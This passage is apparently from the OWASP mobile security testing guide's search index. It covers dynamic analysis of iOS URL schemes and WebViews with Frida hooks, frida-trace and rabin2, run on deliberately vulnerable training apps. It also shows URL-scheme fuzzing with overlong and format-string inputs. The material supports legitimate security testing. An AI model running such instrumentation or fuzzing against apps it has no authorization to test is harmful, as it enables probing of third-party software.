-[SUClientController openURL:]\nObserving  -[SUClientController openURL:inClientWithIdentifier:]\nObserving  -[FBSSystemService openURL:application:options:clientPort:withResult:]\nObserving  -[iGoat_Swift.AppDelegate application:openURL:options:]\nObserving  -[PrefsUILinkLabel openURL:]\nObserving  -[UIApplication openURL:]\nObserving  -[UIApplication _openURL:]\nObserving  -[UIApplication openURL:options:completionHandler:]\nObserving  -[UIApplication openURL:withCompletionHandler:]\nObserving  -[UIApplication _openURL:originatingView:completionHandler:]\nObserving  -[SUApplication application:openURL:sourceApplication:annotation:]\n...\n</code></pre> <p>The list is very long and includes the methods we have already mentioned. If we trigger now one URL scheme, for example \"igoat://\" from Safari and accept to open it in the app we will see the following:</p> <pre><code>[iPhone::iGoat-Swift]-&gt; (0x1c4038280)  -[iGoat_Swift.AppDelegate application:openURL:options:]\napplication: &lt;UIApplication: 0x101d0fad0&gt;\nopenURL: igoat://\noptions: {\n    UIApplicationOpenURLOptionsOpenInPlaceKey = 0;\n    UIApplicationOpenURLOptionsSourceApplicationKey = \"com.apple.mobilesafari\";\n}\n0x18b5030d8 UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke\n0x18b502a94 UIKit!-[UIApplication _applicationOpenURLAction:payload:origin:]\n...\n0x1817e1048 libdispatch.dylib!_dispatch_client_callout\n0x1817e86c8 libdispatch.dylib!_dispatch_block_invoke_direct$VARIANT$mp\n0x18453d9f4 FrontBoardServices!__FBSSERIALQUEUE_IS_CALLING_OUT_TO_A_BLOCK__\n0x18453d698 FrontBoardServices!-[FBSSerialQueue _performNext]\nRET: 0x1\n</code></pre> <p>Now we know that:</p> <ul> <li>The method <code>-[iGoat_Swift.AppDelegate application:openURL:options:]</code> gets called. As we have seen before, it is the recommended way and it is not deprecated.</li> <li>It receives our URL as a parameter: <code>igoat://</code>.</li> <li>We also can verify the source application: <code>com.apple.mobilesafari</code>.</li> <li>We can also know from where it was called, as expected from <code>-[UIApplication _applicationOpenURLAction:payload:origin:]</code>.</li> <li>The method returns <code>0x1</code> which means <code>YES</code> (the delegate successfully handled the request).</li> </ul> <p>The call was successful and we see now that the  iGoat-Swift app was open:</p> <p></p> <p>Notice that we can also see that the caller (source application) was Safari if we look in the upper-left corner of the screenshot.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#dynamically-opening-the-link-from-the-app-itself","title":"Dynamically Opening the Link from the App Itself","text":"<p>It is also interesting to see which other methods get called on the way. To change the result a little bit we will call the same URL scheme from the  iGoat-Swift app itself. We will use again ObjC method observer and the Frida REPL:</p> <pre><code>$ frida -U iGoat-Swift --codeshare mrmacete/objc-method-observer\n\n[iPhone::iGoat-Swift]-&gt; function openURL(url) {\n                            var UIApplication = ObjC.classes.UIApplication.sharedApplication();\n                            var toOpen = ObjC.classes.NSURL.URLWithString_(url);\n                            return UIApplication.openURL_(toOpen);\n                        }\n\n[iPhone::iGoat-Swift]-&gt; observeSomething(\"*[* *openURL*]\");\n[iPhone::iGoat-Swift]-&gt; openURL(\"iGoat://?contactNumber=123456789&amp;message=hola\")\n\n(0x1c409e460)  -[__NSXPCInterfaceProxy__LSDOpenProtocol openURL:options:completionHandler:]\nopenURL: iGoat://?contactNumber=123456789&amp;message=hola\noptions: nil\ncompletionHandler: &lt;__NSStackBlock__: 0x16fc89c38&gt;\n0x183befbec MobileCoreServices!-[LSApplicationWorkspace openURL:withOptions:error:]\n0x10ba6400c\n...\nRET: nil\n\n...\n\n(0x101d0fad0)  -[UIApplication openURL:]\nopenURL: iGoat://?contactNumber=123456789&amp;message=hola\n0x10a610044\n...\nRET: 0x1\n\ntrue\n(0x1c4038280)  -[iGoat_Swift.AppDelegate application:openURL:options:]\napplication: &lt;UIApplication: 0x101d0fad0&gt;\nopenURL: iGoat://?contactNumber=123456789&amp;message=hola\noptions: {\n    UIApplicationOpenURLOptionsOpenInPlaceKey = 0;\n    UIApplicationOpenURLOptionsSourceApplicationKey = \"OWASP.iGoat-Swift\";\n}\n0x18b5030d8 UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke\n0x18b502a94 UIKit!-[UIApplication _applicationOpenURLAction:payload:origin:]\n...\nRET: 0x1\n</code></pre> <p>The output is truncated for better readability. This time you see that <code>UIApplicationOpenURLOptionsSourceApplicationKey</code> has changed to <code>OWASP.iGoat-Swift</code>, which makes sense. In addition, a long list of <code>openURL</code>-like methods were called. Considering this information can be very useful for some scenarios as it will help you to decide what you next steps will be, e.g. which method you will hook or tamper with next.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#opening-a-link-by-navigating-to-a-page-and-letting-safari-open-it","title":"Opening a Link by Navigating to a Page and Letting Safari Open It","text":"<p>You can now test the same situation when clicking on a link contained on a page. Safari will identify and process the URL scheme and choose which action to execute. Opening this link \"https://telegram.me/fridadotre\" will trigger this behavior.</p> <p></p> <p>First of all we let frida-trace generate the stubs for us:</p> <pre><code>$ frida-trace -U Telegram -m \"*[* *restorationHandler*]\" -i \"*open*Url*\"\n    -m \"*[* *application*URL*]\" -m \"*[* openURL]\"\n\n...\n7310 ms  -[UIApplication _applicationOpenURLAction: 0x1c44ff900 payload: 0x10c5ee4c0 origin: 0x0]\n7311 ms     | -[AppDelegate application: 0x105a59980 openURL: 0x1c46ebb80 options: 0x1c0e222c0]\n7312 ms     | $S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData\n            18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA14Open\n            URLContextOSSSbAA012PresentationK0CAA0a11ApplicationM0C7Display010NavigationO0CSgyyctF()\n</code></pre> <p>Now we can simply modify by hand the stubs we are interested in:</p> <ul> <li> <p>The Objective-C method <code>application:openURL:options:</code>:</p> <pre><code>// __handlers__/__AppDelegate_application_openUR_3679fadc.js\n\nonEnter: function (log, args, state) {\n    log(\"-[AppDelegate application: \" + args[2] +\n                \" openURL: \" + args[3] + \" options: \" + args[4] + \"]\");\n    log(\"\\tapplication :\" + ObjC.Object(args[2]).toString());\n    log(\"\\topenURL :\" + ObjC.Object(args[3]).toString());\n    log(\"\\toptions :\" + ObjC.Object(args[4]).toString());\n},\n</code></pre> </li> <li> <p>The Swift method <code>$S10TelegramUI15openExternalUrl...</code>:</p> <pre><code>// __handlers__/TelegramUI/_S10TelegramUI15openExternalUrl7_b1a3234e.js\n\nonEnter: function (log, args, state) {\n\n    log(\"TelegramUI.openExternalUrl(account, url, presentationData,\" +\n                \"applicationContext, navigationController, dismissInput)\");\n    log(\"\\taccount: \" + ObjC.Object(args[1]).toString());\n    log(\"\\turl: \" + ObjC.Object(args[2]).toString());\n    log(\"\\tpresentationData: \" + args[3]);\n    log(\"\\tapplicationContext: \" + ObjC.Object(args[4]).toString());\n    log(\"\\tnavigationController: \" + ObjC.Object(args[5]).toString());\n},\n</code></pre> </li> </ul> <p>The next time we run it, we see the following output:</p> <pre><code>$ frida-trace -U Telegram -m \"*[* *restorationHandler*]\" -i \"*open*Url*\"\n    -m \"*[* *application*URL*]\" -m \"*[* openURL]\"\n\n  8144 ms  -[UIApplication _applicationOpenURLAction: 0x1c44ff900 payload: 0x10c5ee4c0 origin: 0x0]\n  8145 ms     | -[AppDelegate application: 0x105a59980 openURL: 0x1c46ebb80 options: 0x1c0e222c0]\n  8145 ms     |     application: &lt;Application: 0x105a59980&gt;\n  8145 ms     |     openURL: tg://resolve?domain=fridadotre\n  8145 ms     |     options :{\n                        UIApplicationOpenURLOptionsOpenInPlaceKey = 0;\n                        UIApplicationOpenURLOptionsSourceApplicationKey = \"com.apple.mobilesafari\";\n                    }\n  8269 ms     |    | TelegramUI.openExternalUrl(account, url, presentationData,\n                                        applicationContext, navigationController, dismissInput)\n  8269 ms     |    |    account: nil\n  8269 ms     |    |    url: tg://resolve?domain=fridadotre\n  8269 ms     |    |    presentationData: 0x1c4c51741\n  8269 ms     |    |    applicationContext: nil\n  8269 ms     |    |    navigationController: TelegramUI.PresentationData\n  8274 ms     | -[UIApplication applicationOpenURL:0x1c46ebb80]\n</code></pre> <p>There you can observe the following:</p> <ul> <li>It calls <code>application:openURL:options:</code> from the app delegate as expected.</li> <li>The source application is Safari (\"com.apple.mobilesafari\").</li> <li><code>application:openURL:options:</code> handles the URL but does not open it, it calls <code>TelegramUI.openExternalUrl</code> for that.</li> <li>The URL being opened is <code>tg://resolve?domain=fridadotre</code>.</li> <li>It uses the <code>tg://</code> custom URL scheme from Telegram.</li> </ul> <p>It is interesting to see that if you navigate again to \"https://telegram.me/fridadotre\", click on cancel and then click on the link offered by the page itself (\"Open in the Telegram app\"), instead of opening via custom URL scheme it will open via universal links.</p> <p></p> <p>You can try this while tracing both methods:</p> <pre><code>$ frida-trace -U Telegram -m \"*[* *restorationHandler*]\" -m \"*[* *application*openURL*options*]\"\n\n// After clicking \"Open\" on the pop-up\n\n 16374 ms  -[AppDelegate application :0x10556b3c0 openURL :0x1c4ae0080 options :0x1c7a28400]\n 16374 ms   application :&lt;Application: 0x10556b3c0&gt;\n 16374 ms   openURL :tg://resolve?domain=fridadotre\n 16374 ms   options :{\n    UIApplicationOpenURLOptionsOpenInPlaceKey = 0;\n    UIApplicationOpenURLOptionsSourceApplicationKey = \"com.apple.mobilesafari\";\n}\n\n// After clicking \"Cancel\" on the pop-up and \"OPEN\" in the page\n\n406575 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c063d0c0\n                restorationHandler:0x16f27a898]\n406575 ms  application:&lt;Application: 0x10556b3c0&gt;\n406575 ms  continueUserActivity:&lt;NSUserActivity: 0x1c063d0c0&gt;\n406575 ms       webpageURL:https://telegram.me/fridadotre\n406575 ms       activityType:NSUserActivityTypeBrowsingWeb\n406575 ms       userInfo:{\n}\n406575 ms  restorationHandler:&lt;__NSStackBlock__: 0x16f27a898&gt;\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#testing-for-deprecated-methods_1","title":"Testing for Deprecated Methods","text":"<p>Search for deprecated methods like:</p> <ul> <li><code>application:handleOpenURL:</code></li> <li><code>openURL:</code></li> <li><code>application:openURL:sourceApplication:annotation:</code></li> </ul> <p>You may simply use frida-trace for this, to see if any of those methods are being used.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#testing-url-schemes-source-validation","title":"Testing URL Schemes Source Validation","text":"<p>A way to discard or confirm validation could be by hooking typical methods that might be used for that. For example <code>isEqualToString:</code>:</p> <pre><code>// - (BOOL)isEqualToString:(NSString *)aString;\n\nvar isEqualToString = ObjC.classes.NSString[\"- isEqualToString:\"];\n\nInterceptor.attach(isEqualToString.implementation, {\n  onEnter: function(args) {\n    var message = ObjC.Object(args[2]);\n    console.log(message)\n  }\n});\n</code></pre> <p>If we apply this hook and call the URL scheme again:</p> <pre><code>$ frida -U iGoat-Swift\n\n[iPhone::iGoat-Swift]-&gt; var isEqualToString = ObjC.classes.NSString[\"- isEqualToString:\"];\n\n                    Interceptor.attach(isEqualToString.implementation, {\n                      onEnter: function(args) {\n                        var message = ObjC.Object(args[2]);\n                        console.log(message)\n                      }\n                    });\n{}\n[iPhone::iGoat-Swift]-&gt; openURL(\"iGoat://?contactNumber=123456789&amp;message=hola\")\ntrue\nnil\n</code></pre> <p>Nothing happens. This tells us already that this method is not being used for that as we cannot find any app-package-looking string like <code>OWASP.iGoat-Swift</code> or <code>com.apple.mobilesafari</code> between the hook and the text of the tweet. However, consider that we are just probing one method, the app might be using other approach for the comparison.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#fuzzing-url-schemes","title":"Fuzzing URL Schemes","text":"<p>If the app parses parts of the URL, you can also perform input fuzzing to detect memory corruption bugs.</p> <p>What we have learned above can be now used to build your own fuzzer on the language of your choice, e.g. in Python and call the <code>openURL</code> using Frida's RPC. That fuzzer should do the following:</p> <ul> <li>Generate payloads.</li> <li>For each of them call <code>openURL</code>.</li> <li>Check if the app generates a crash report (<code>.ips</code>) in <code>/private/var/mobile/Library/Logs/CrashReporter</code>.</li> </ul> <p>The FuzzDB project offers fuzzing dictionaries that you can use as payloads.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#using-frida_1","title":"Using Frida","text":"<p>Doing this with Frida is pretty easy, as explained in this blog post to see an example that fuzzes the  iGoat-Swift app (working on iOS 11.1.2).</p> <p>Before running the fuzzer we need the URL schemes as inputs. From the static analysis we know that the iGoat-Swift app supports the following URL scheme and parameters: <code>iGoat://?contactNumber={0}&amp;message={0}</code>.</p> <pre><code>$ frida -U SpringBoard -l ios-url-scheme-fuzzing.js\n[iPhone::SpringBoard]-&gt; fuzz(\"iGoat\", \"iGoat://?contactNumber={0}&amp;message={0}\")\nWatching for crashes from iGoat...\nNo logs were moved.\nOpened URL: iGoat://?contactNumber=0&amp;message=0\nOK!\nOpened URL: iGoat://?contactNumber=1&amp;message=1\nOK!\nOpened URL: iGoat://?contactNumber=-1&amp;message=-1\nOK!\nOpened URL: iGoat://?contactNumber=null&amp;message=null\nOK!\nOpened URL: iGoat://?contactNumber=nil&amp;message=nil\nOK!\nOpened URL: iGoat://?contactNumber=99999999999999999999999999999999999\n&amp;message=99999999999999999999999999999999999\nOK!\nOpened URL: iGoat://?contactNumber=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n...\n&amp;message=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n...\nOK!\nOpened URL: iGoat://?contactNumber=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n...\n&amp;message=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n...\nOK!\nOpened URL: iGoat://?contactNumber='&amp;message='\nOK!\nOpened URL: iGoat://?contactNumber=%20d&amp;message=%20d\nOK!\nOpened URL: iGoat://?contactNumber=%20n&amp;message=%20n\nOK!\nOpened URL: iGoat://?contactNumber=%20x&amp;message=%20x\nOK!\nOpened URL: iGoat://?contactNumber=%20s&amp;message=%20s\nOK!\n</code></pre> <p>The script will detect if a crash occurred. On this run it did not detect any crashed but for other apps this could be the case. We would be able to inspect the crash reports in <code>/private/var/mobile/Library/Logs/CrashReporter</code> or in <code>/tmp</code> if it was moved by the script.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/","title":"MASTG-TEST-0076: Testing iOS WebViews","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0076: Testing iOS WebViews (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/#static-analysis","title":"Static Analysis","text":"<p>For the static analysis we will focus mostly on the following points having <code>UIWebView</code> and <code>WKWebView</code> under scope.</p> <ul> <li>Identifying WebView usage</li> <li>Testing if JavaScript is Enabled</li> <li>Testing for Mixed Content</li> <li>Testing for WebView URI Manipulation</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/#identifying-webview-usage","title":"Identifying WebView Usage","text":"<p>Look out for usages of the above mentioned WebView classes by searching in Xcode.</p> <p>In the compiled binary you can search in its symbols or strings, for example using  rabin2 like this:</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/#uiwebview","title":"UIWebView","text":"<pre><code>$ rabin2 -zz ./WheresMyBrowser | egrep \"UIWebView$\"\n489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView\n896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView\n1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/#wkwebview","title":"WKWebView","text":"<pre><code>$ rabin2 -zz ./WheresMyBrowser | egrep \"WKWebView$\"\n490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView\n625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView\n904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView\n1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView\n</code></pre> <p>Alternatively you can also search for known methods of these WebView classes. For example, search for the method used to initialize a WKWebView (<code>init(frame:configuration:)</code>):</p> <pre><code>$ rabin2 -zzq ./WheresMyBrowser | egrep \"WKWebView.*frame\"\n0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC\n0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO\n0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC\n0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO\n</code></pre> <p>You can also demangle it:</p> <pre><code>$ xcrun swift-demangle __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO\n\n---&gt; @nonobjc __C.WKWebView.init(frame: __C_Synthesized.CGRect,\n                                configuration: __C.WKWebViewConfiguration) -&gt; __C.WKWebView\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/#testing-if-javascript-is-enabled","title":"Testing if JavaScript is Enabled","text":"<p>First of all, remember that JavaScript cannot be disabled for <code>UIWebView</code>s.</p> <p>For <code>WKWebView</code>s, as a best practice, JavaScript should be disabled unless it is explicitly required. To verify that JavaScript was properly disabled search the project for usages of <code>WKPreferences</code> and ensure that the <code>javaScriptEnabled</code> property is set to <code>false</code>:</p> <pre><code>let webPreferences = WKPreferences()\nwebPreferences.javaScriptEnabled = false\n</code></pre> <p>If only having the compiled binary you can search for this in it using  rabin2:</p> <pre><code>$ rabin2 -zz ./WheresMyBrowser | grep -i \"javascriptenabled\"\n391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled\n392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled:\n</code></pre> <p>If user scripts were defined, they will continue running as the <code>javaScriptEnabled</code> property won't affect them. See <code>WKUserContentController</code> and WKUserScript for more information on injecting user scripts to WKWebViews.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/#testing-for-mixed-content","title":"Testing for Mixed Content","text":"<p>In contrast to <code>UIWebView</code>s, when using <code>WKWebView</code>s it is possible to detect mixed content (HTTP content loaded from a HTTPS page). By using the method <code>hasOnlySecureContent</code> it can be verified whether all resources on the page have been loaded through securely encrypted connections. This example from [#thiel2] (see page 159 and 160) uses this to ensure that only content loaded via HTTPS is shown to the user, otherwise an alert is displayed telling the user that mixed content was detected.</p> <p>In the compiled binary you can use  rabin2:</p> <pre><code>$ rabin2 -zz ./WheresMyBrowser | grep -i \"hasonlysecurecontent\"\n\n# nothing found\n</code></pre> <p>In this case, the app does not make use of this.</p> <p>In addition, if you have the original source code or the IPA, you can inspect the embedded HTML files and verify that they do not include mixed content. Search for <code>http://</code> in the source and inside tag attributes, but remember that this might give false positives as, for example, finding an anchor tag <code>&lt;a&gt;</code> that includes a <code>http://</code> inside its <code>href</code> attribute does not always present a mixed content issue. Learn more about mixed content in the MDN Web Docs.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/#testing-for-webview-uri-manipulation","title":"Testing for WebView URI Manipulation","text":"<p>Make sure that the WebView's URI cannot be manipulated by the user in order to load other types of resources than necessary for the functioning of the WebView. This can be specifically dangerous when the WebView's content is loaded from the local file system, allowing the user to navigate to other resources within the application.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>For the dynamic analysis we will address the same points from the static analysis.</p> <ul> <li>Enumerating WebView Instances</li> <li>Testing if JavaScript is Enabled</li> <li>Testing for Mixed Content</li> </ul> <p>It is possible to identify WebViews and obtain all their properties on runtime by performing dynamic instrumentation. This is very useful when you don't have the original source code.</p> <p>For the following examples, we will keep using the \"Where's My Browser?\" app and Frida REPL.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/#enumerating-webview-instances","title":"Enumerating WebView Instances","text":"<p>Once you've identified a WebView in the app, you may inspect the heap in order to find instances of one or several of the WebViews that we have seen above.</p> <p>For example, if you use Frida you can do so by inspecting the heap via \"ObjC.choose()\"</p> <pre><code>ObjC.choose(ObjC.classes['UIWebView'], {\n  onMatch: function (ui) {\n    console.log('onMatch: ', ui);\n    console.log('URL: ', ui.request().toString());\n  },\n  onComplete: function () {\n    console.log('done for UIWebView!');\n  }\n});\n\nObjC.choose(ObjC.classes['WKWebView'], {\n  onMatch: function (wk) {\n    console.log('onMatch: ', wk);\n    console.log('URL: ', wk.URL().toString());\n  },\n  onComplete: function () {\n    console.log('done for WKWebView!');\n  }\n});\n\nObjC.choose(ObjC.classes['SFSafariViewController'], {\n  onMatch: function (sf) {\n    console.log('onMatch: ', sf);\n  },\n  onComplete: function () {\n    console.log('done for SFSafariViewController!');\n  }\n});\n</code></pre> <p>For the <code>UIWebView</code> and <code>WKWebView</code> WebViews we also print the associated URL for the sake of completion.</p> <p>In order to ensure that you will be able to find the instances of the WebViews in the heap, be sure to first navigate to the WebView you've found. Once there, run the code above, e.g. by copying into the Frida REPL:</p> <pre><code>$ frida -U com.authenticationfailure.WheresMyBrowser\n\n# copy the code and wait ...\n\nonMatch:  &lt;UIWebView: 0x14fd25e50; frame = (0 126; 320 393);\n                autoresize = RM+BM; layer = &lt;CALayer: 0x1c422d100&gt;&gt;\nURL:  &lt;NSMutableURLRequest: 0x1c000ef00&gt; {\n  URL: file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/\n          Library/UIWebView/scenario1.html, Method GET, Headers {\n    Accept =     (\n        \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\"\n    );\n    \"Upgrade-Insecure-Requests\" =     (\n        1\n    );\n    \"User-Agent\" =     (\n        \"Mozilla/5.0 (iPhone; CPU iPhone ... AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/...\"\n    );\n} }\n</code></pre> <p>Now we quit with <code>q</code> and open another WebView (<code>WKWebView</code> in this case). It also gets detected if we repeat the previous steps:</p> <pre><code>$ frida -U com.authenticationfailure.WheresMyBrowser\n\n# copy the code and wait ...\n\nonMatch:  &lt;WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = &lt;CALayer: 0x1c4238f20&gt;&gt;\nURL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/\n            Library/WKWebView/scenario1.html\n</code></pre> <p>We will extend this example in the following sections in order to get more information from the WebViews. We recommend to store this code to a file, e.g. webviews_inspector.js and run it like this:</p> <pre><code>frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/#checking-if-javascript-is-enabled","title":"Checking if JavaScript is Enabled","text":"<p>Remember that if a <code>UIWebView</code> is being used, JavaScript is enabled by default and there's no possibility to disable it.</p> <p>For <code>WKWebView</code>, you should verify if JavaScript is enabled. Use <code>javaScriptEnabled</code> from <code>WKPreferences</code> for this.</p> <p>Extend the previous script with the following line:</p> <pre><code>ObjC.choose(ObjC.classes['WKWebView'], {\n  onMatch: function (wk) {\n    console.log('onMatch: ', wk);\n    console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());\n//...\n  }\n});\n</code></pre> <p>The output shows now that, in fact, JavaScript is enabled:</p> <pre><code>$ frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js\n\nonMatch:  &lt;WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = &lt;CALayer: 0x1c4238f20&gt;&gt;\n\njavaScriptEnabled:  true\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/#testing-for-mixed-content_1","title":"Testing for Mixed Content","text":"<p>The <code>UIWebView</code> class does not provide a method for verifying that only secure content is allowed. However, starting on iOS 10, the <code>Upgrade-Insecure-Requests</code> CSP (Content Security Policy) directive was introduced to WebKit, the browser engine powering the iOS WebViews. This directive can be used to instruct the browser to upgrade insecure requests to secure requests. This is a good practice to prevent mixed content issues.</p> <p>For <code>WKWebView</code>'s, you may call the method <code>hasOnlySecureContent</code> for each of the <code>WKWebView</code>s found in the heap. Remember to do so once the WebView has loaded.</p> <p>Extend the previous script with the following line:</p> <pre><code>ObjC.choose(ObjC.classes['WKWebView'], {\n  onMatch: function (wk) {\n    console.log('onMatch: ', wk);\n    console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());\n    //...\n      }\n    });\n</code></pre> <p>The output shows that some of the resources on the page have been loaded through insecure connections:</p> <pre><code>$ frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js\n\nonMatch:  &lt;WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = &lt;CALayer: 0x1c4238f20&gt;&gt;\n\nhasOnlySecureContent:  